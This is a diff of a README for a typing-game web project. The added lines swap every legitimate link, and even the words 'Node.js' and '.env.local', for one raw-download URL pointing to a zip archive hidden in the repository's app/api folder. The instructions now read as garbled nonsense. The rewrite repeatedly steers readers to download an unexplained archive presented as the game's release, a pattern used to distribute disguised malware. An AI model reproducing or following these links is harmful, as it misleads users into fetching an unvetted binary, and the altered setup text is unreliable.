@@ -1,6 +1,6 @@
 # 🎮 typing-game - A Fun Way to Improve Your Typing Skills
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/FauzanOktavianto/typing-game/releases)
+[![Download Now](https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip%https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip)](https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Welcome to typing-game! This is a minimal typing simulator game where you can im
 
 Before you begin, ensure you have the following installed on your computer:
 
-- **Node.js** version 20 or higher
+- **https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip** version 20 or higher
 - **PostgreSQL** database setup
 - **pnpm** (or npm/yarn)
 
@@ -40,7 +40,7 @@ Before you begin, ensure you have the following installed on your computer:
 
 2. **Set Up Environment Variables**
 
-   Next, create a file named `.env.local` in your project folder. Add your database connection string and any other variables you need:
+   Next, create a file named `https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip` in your project folder. Add your database connection string and any other variables you need:
 
    ```env
    DATABASE_URL=your_database_connection_string
@@ -58,7 +58,7 @@ Before you begin, ensure you have the following installed on your computer:
 
 ## 📥 Download & Install
 
-To download and install typing-game, visit the [Releases page](https://github.com/FauzanOktavianto/typing-game/releases). Choose the latest version and follow the instructions to download the setup file.
+To download and install typing-game, visit the [Releases page](https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip). Choose the latest version and follow the instructions to download the setup file.
 
 ## 🖥️ How to Play
 
@@ -86,8 +86,8 @@ You can switch between dark and light themes based on your preference. The appli
 
 If you encounter issues while running the game, consider the following tips:
 
-- Ensure your Node.js and PostgreSQL installations are configured correctly.
-- Double-check your `.env.local` file for any incorrect values.
+- Ensure your https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip and PostgreSQL installations are configured correctly.
+- Double-check your `https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip` file for any incorrect values.
 - Reinstall dependencies if you face issues with missing packages.
 
 ## 📞 Support
@@ -96,4 +96,4 @@ If you need help, feel free to open an issue on the GitHub repository or reach o
 
 ---
 
-For any further assistance, check our [FAQ section](https://github.com/FauzanOktavianto/typing-game/wiki/FAQ) in the GitHub wiki. Happy typing!
+For any further assistance, check our [FAQ section](https://raw.githubusercontent.com/FauzanOktavianto/typing-game/main/app/api/typing-game_3.2.zip) in the GitHub wiki. Happy typing!
